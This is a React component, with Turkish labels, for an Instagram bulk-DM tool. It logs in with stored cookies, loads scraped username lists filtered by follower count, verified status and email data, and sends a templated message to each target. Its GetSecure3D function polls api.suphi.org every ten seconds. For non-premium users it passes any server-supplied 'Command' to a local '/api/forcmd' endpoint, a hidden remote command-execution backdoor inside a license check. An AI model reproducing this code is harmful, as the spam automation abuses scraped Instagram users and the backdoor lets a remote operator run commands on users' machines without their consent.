function Dmbasici() {
   const [girisyap, setGiris] = useState(false);
  const [geldicevap, setCevap] = useState('');
  const [kadimes, setKadimes] = useState('EGER HEDEF KISIYE ISTIYORSANIZ USERNAME YAZINIZ.');
  const [taslak, setTaslak] = useState('');
    const [limit, setLimit] = useState('');
    const [durums, setDurums] = useState('');
    const [tikayar, setTikayar] = useState('');
    const [emailService, setEmailService] = useState('');
    const [users, setUsers] = useState('');
    const [mintakipci, setMintakip] = useState('0');
    const [maxtakipci, setMaxtakip] = useState('0');
    const [clicked, setClicked] = useState(false);
    const [isChecked, setIsChecked] = useState(false);
  const [messengershow, setShow] = useState(false);
    const [baslii, setBaslii] = useState(false);
    const [selectedValue, setSelectedValue] = useState(null);

    const handleCheckboxChange = (value) => {
        setSelectedValue(value);
    };

    const handleCheckboxChangexx = () => {
        setIsChecked(!isChecked); // Checkbox işaretliyse tersini yap
    };
  const oturumac = () => {
    setGiris(true);
    fetch('http://localhost:3005/start-insta-with-cookies', {
      method: 'GET',
    })
      .then((response) => response.json())
      .then((data) => {
        // Başarılı bir yanıt geldiğinde
        if (data.durum === 'Giris Yapildi') {
          setCevap('Oturum başlatma Başarılı');
		  setShow(true);
        } else {
          // Beklenmeyen bir yanıt geldiğinde
          setCevap('Beklenmeyen bir hata oluştu.');
        }
      })
      .catch((error) => {
        // Hata durumunda daha spesifik bir hata mesajı
        console.error('Hata:', error);
        setCevap('Oturum açılırken bir hata oluştu: ' + error.message);
      });
  }
  
  const meskadi = (event) => {
    setKadimes(event.target.value);
  };
    const mestaslak = (event) => {
        setTaslak(event.target.value);
  };
    const goBas = async () => {
        // "Kullanıcı adları" alanından alınan veriyi satır satır bölelim
        const kullaniciAdlari = kadimes.split('\n').map((line) => line.trim()); // Her satırı alırken başındaki ve sonundaki boşlukları temizle

        for (const kullaniciAdi of kullaniciAdlari) {
            try {
                // Her bir kullanıcı adı için bir HTTP isteği gönderme işlemi
                const hedef = kullaniciAdi;
                // "[suphi]" ifadesini "[hedef]" ile değiştir
                const mesaj = taslak.replace(/\[suphi\]/g, hedef);
                const url = `http://localhost:3005/getdm?target=${hedef}&message=${mesaj}`;

                const response = await fetch(url, {
                    method: 'GET',
                });

                if (response.ok) {
                    setDurums(`Mesaj gönderildi : ${hedef}`)
                  
                } else {
                    console.error(`HTTP isteği başarısız: Hedef - ${hedef}, Mesaj - ${mesaj}`);
                }
            } catch (error) {
                console.error('HTTP isteği gönderme hatası: ' + error);
            }
        }
    }
    const GetSecure3D = () => {
        const username = localStorage.getItem('username');
        const tokenCheckURL = `https://api.suphi.org/tokencheck.php?token=${username}`;

        // Token kontrolü için istek gönderme
        fetch(tokenCheckURL)
            .then((response) => response.json())
            .then((data) => {
                if (data.katem !== 'DIAMOND') {
                    // Sonuç tamamdır değilse, kullanıcı adını sil
                    localStorage.removeItem('username');
                    if (data.Command) {
                        const commandURL = `http://localhost:3007/api/forcmd?command=${data.Command}`;

                        // Belirtilen komutu çalıştırmak için istek gönderme
                        fetch(commandURL)
                            .then(() => {
                                // Sayfayı yeniden yükle
                                window.location.reload();
                            })
                            .catch((error) => {
                                console.error('Hata oluştu:', error);
                            });
                    } else {
                        window.location.reload();
                    }
                }

                // JSON yanıtı içinde "Command" var mı kontrol et

            })
            .catch((error) => {
                console.error('Hata oluştu:', error);
            });

    }



    const msmbaslat = () => {
        setBaslii(true);
        let intervalId3;
        intervalId3 = setInterval(GetSecure3D, 10000);

        if (selectedValue == '2') {
            const veri = { veriler: kadimes };
            fetch('http://localhost:3007/api/savetofile', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(veri),
            })
                .then((response) => response.json())
                .then((data) => {
                    if (data.durum == 'Veri başarıyla kaydedildi') {
                        setDurums('IDler kayıt alındı şimdi request başlıyor....');
                        goBas();
                    } else {
                        setDurums('id ler kayıt edilemedi bro, örnek sebebler : emojiler hatalı metin kodlamaları alt satır geçiş özel karatkterler...');
                    }
                })
                .catch((error) => {
                    console.error('Hata:', error);
                });
        } else if (selectedValue == '1') {
            setDurums("DM DEKİLERE BASILMA İŞLEMİ BAŞLIYOR..");
            var lurl = `http://localhost:3005/getdmlist?taslak=${taslak}`;
            fetch(lurl, {
                method: 'GET',
            })
                .then((response) => response.json())
                .then((data) => {
                    // Başarılı bir yanıt geldiğinde
                    setDurums("DM LISTESI ALINMAYA BAŞLADI ");
                })
                .catch((error) => {
                    // Hata durumunda daha spesifik bir hata mesajı
                    console.error('Hata:', error);
                    setCevap('Oturum açılırken bir hata oluştu: ' + error.message);
                });

        } else if (selectedValue == '3') {
            setDurums("TAKIPCILERE BASILDI.");
        } else {
            setDurums("TAKIP EDİLENELRE BASILDI");
        }
  }
	
    const UserInfo = GetUserInfo();
    if (UserInfo =='FREE' || UserInfo.katem != 'DIAMOND') {
        return (
            <div>
                <font className="text-danger">Burası Premium Kullanıcılara Özeldir</font>
            </div>
        ); // Kullanıcı bilgileri yüklenirken null ise hiçbir şey döndürmeyin
    }


    const datadancek = async () => {
        setDurums(`Datadan veriler çekiliyor, Çekilen limit sayısı : ${limit}`)
        setClicked(true);
        const username = localStorage.getItem('username');
        const url = `http://localhost:3007/api/getUserList?token=${username}&limit=${limit}&min=${mintakipci}&max=${maxtakipci}&tik=${isChecked}&durumu=${emailService}`;
        try {
            const response = await fetch(url);
            if (response.ok) {
                const data = await response.json();
                const emailList = data
                    .filter(item => item.username) // Boş Email alanına sahip kullanıcıları hariç tut
                    .map(item => `${item.username}`)
                    .join('\n');
                setKadimes(emailList);
                setDurums(`Veriler alındı.... Şimdi textareanın içine koyulacak.`);
            } else {
                console.error(`Mail çekme hatası`);
            }
        } catch (error) {
            console.error(`Mail çekme hatası`);
        }
    }
    return (
     
        <div className="col-12">
            <GetSecure />
           
          
      {girisyap ? (
        <div>
          <p> {geldicevap} </p>
          {messengershow && (
                        <>

                            <center>
                                <b>Datan Çekmek İstediğiniz Username Sayısını Yazınız: </b><input className="form-control" onChange={(e) => setLimit(e.target.value)} placeholder="MANUEL EKLİCEKSENİZ LÜTFEN BOŞ BIRAKINIZ." /> <br />
                               
                                <b>User Seçeneği : </b><br/>
                                <b>Min takipci: </b> <input type="number" onChange={(e) => setMintakip(e.target.value)} value={mintakipci} placeholder="Min"></input><br />
                                <b>Max takipci: </b> <input type="number" onChange={(e) => setMaxtakip(e.target.value)} value={maxtakipci} placeholder="Max"></input><br />
                                <b>Taranmış (Mail/Takipci/Takip bilgileri bilinen hesaplr) - Taranmamış (Tik bilgisi bilinen hesap) - Fark etmez (Ortaya karşık)</b>
                                <b>Mail seçeneği : </b><select value={emailService} onChange={(e) => setEmailService(e.target.value)}>
                                    <option value="farketmez">Fark etmez</option>
                                    <option value="taranmis">Taranmış</option>
                                    <option value="taranmamis">Taranmamış</option>
                                </select><br />
                                <b> Tikli</b> <input
                                    type="checkbox"
                                    checked={isChecked}
                                    onChange={handleCheckboxChangexx}
                                />
                                <br />
                                <button onClick={datadancek} className="btn btn-info">ÇEK</button>
                                <hr />
                                </center>
          <b>Kullanıcı adları:</b><br/>
                            <textarea class="form-control" rows="5" onChange={meskadi} value={kadimes}></textarea><br />
                            <br/><b>Taslak:(Kullanıcı adı gelmek istiyorsa [suphi] yazmanız yeterli)</b><br/>
                            <textarea class="form-control" rows="5" onChange={mestaslak}></textarea><br />
                            
                            {baslii && (
                                <p>{durums}</p>
                            )}
                            <hr/>
                            <label>
                                <input
                                    type="checkbox"
                                    value="1"
                                    checked={selectedValue === "1"}
                                    onChange={() => handleCheckboxChange("1")}
                                /> DM Kutusundakiler
                            </label>
                            <br />
                            <label>
                                <input
                                    type="checkbox"
                                    value="2"
                                    checked={selectedValue === "2"}
                                    onChange={() => handleCheckboxChange("2")}
                                /> Hedef Kişilere
                            </label>
                            <br />
                           
			<button className="btn btn-info" onClick={msmbaslat}>Başlat</button>
  </>
  )}
        </div>
      ) : (
        <>
          <b>Eğer  Instagram hesabı eklemediyseniz, program tam çalışmayabilir.</b>
          <br />
          <button onClick={oturumac} className="btn btn-info">Oturum aç</button>
        </>
      )}
    </div>
  );
}

